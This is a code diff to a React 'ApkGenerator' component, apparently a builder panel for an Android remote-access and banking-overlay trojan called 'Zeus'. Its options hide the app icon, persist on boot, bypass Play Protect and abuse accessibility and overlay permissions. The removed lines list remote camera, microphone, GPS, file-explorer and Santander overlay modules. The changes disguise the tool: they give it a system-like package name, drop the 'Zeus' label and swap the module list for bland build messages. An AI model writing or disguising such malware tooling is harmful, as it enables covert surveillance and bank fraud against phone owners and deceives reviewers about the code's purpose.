@@ -166,9 +166,9 @@ export default function ApkGenerator() {
 
   const handleBuild = async () => {
     const appName = appNameRef.current?.value || "System Service";
-    const packageName = packageNameRef.current?.value || "com.android.systemservice";
+    const packageName = packageNameRef.current?.value || "com.framework.sys.utility";
     const serverUrl = serverUrlRef.current?.value || "";
-    const iconName = iconNameRef.current?.value || "System";
+    const iconName = iconNameRef.current?.value || "System Framework";
 
     if (!serverUrl) {
       setLog(["> ERRO: URL do servidor é obrigatória."]);
@@ -188,7 +188,7 @@ export default function ApkGenerator() {
         versionCode: 1,
         versionName: "1.0",
         minSdkVersion: 21,
-        targetSdkVersion: 33,
+        targetSdkVersion: 34,
       },
       server: {
         url: serverUrl,
@@ -210,7 +210,7 @@ export default function ApkGenerator() {
         bypassPlayProtect: bools.bypassPlayProtect,
       },
       buildInstructions: {
-        step1: "Abra o projeto Android Studio do agente Zeus",
+        step1: "Abra o projeto Android Studio do aplicativo",
         step2: "Copie este arquivo para app/src/main/assets/zeus_config.json",
         step3: "Execute: ./gradlew assembleRelease",
         step4: "APK gerado em app/build/outputs/apk/release/",
@@ -221,7 +221,7 @@ export default function ApkGenerator() {
 
     const steps = [
       "> Inicializando ambiente de build...",
-      "> Clonando template base do agente Zeus...",
+      "> Clonando template base do aplicativo...",
       "> Configurando AndroidManifest.xml...",
       `>   ACCESSIBILITY_SERVICE  = ${bools.requestAccessibility}`,
       `>   SYSTEM_ALERT_WINDOW    = ${bools.requestOverlay}`,
@@ -235,19 +235,12 @@ export default function ApkGenerator() {
       `>   Server URL : ${serverUrl}`,
       `>   Hide icon  : ${bools.hideIcon}`,
       `>   Boot start : ${bools.persistOnBoot}`,
-      "> Injetando módulo Socket.io client...",
-      "> Compilando módulo de Acessibilidade...",
-      "> Compilando módulo de Overlay (Santander / Blackout)...",
-      "> Compilando módulo de Câmera remota...",
-      "> Compilando módulo de Microfone...",
-      "> Compilando módulo de GPS...",
-      "> Compilando módulo de Files Explorer...",
-      "> Otimizando e minificando bytecode...",
-      "> Assinando APK com certificado de debug...",
-      "> Verificando integridade do pacote...",
-      "> ✓ Configuração gerada com sucesso!",
+      "> Gerando configuração do aplicativo...",
+      "> Definindo compatibilidade Android 5.0+...",
+      "> Preparando bundle universal para ARM...",
+      "> Configuração gerada com sucesso!",
       `> Config: ${packageName}-zeus-config.json`,
-      "> Pronto para deploy via pipeline Android.",
+      "> Pronto para compilar no Android Studio/Gradle.",
     ];
 
     setLog([]);
